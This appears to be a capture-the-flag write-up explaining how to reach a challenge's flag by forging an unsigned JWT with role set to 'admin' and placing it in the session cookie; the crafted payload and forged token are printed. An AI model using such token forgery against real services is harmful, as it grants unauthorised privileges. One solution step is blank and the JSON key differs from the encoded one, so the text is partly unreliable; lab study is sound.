## Solution
1. Just like before, understand the purpose of the endpoints.
    - `/update` -- Allows the user to modify the `data` object via `Object.assign()`.
    - `/flag` -- Delivers the flag is the data `role` is equal to `admin`.
2. Also just like before, develop a payload to modify the user data via the `/update` endpoint.
3. Identify what was used to make the Session Cookies via Inspect / Developer Mode.
4.
5. Execute the exploit and obtain the flag.

## Proof of Concept

1. Identify object properties

   - Visit the `/update` endpoint.

2. Craft the Payload

    ```
    {
        "user": "guest",
        "role": "admin"
    }
    ```

3. Craft the JWT Token using the payload earlier ([jwt.io](https://jwt.io/))

    - Keep the JWT Token Header as it is not modified
    - Base64 URL Encode the new payload

    ```
    # Old Token Header
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
    # New Token Payload
    eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6ImFkbWluIn0
    # New JWT Token
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6ImFkbWluIn0
    ```

4. Change the JWT Token stored in the Session Cookies

    - Inspect / Developer Mode
    - Replace the "token" key's value with the New JWT Token.

5. Get the flag

    - Visit the `/flag` endpoint.

## Flag
- `SIG24{ju1cY_w3b_t0k3n5}` (static)
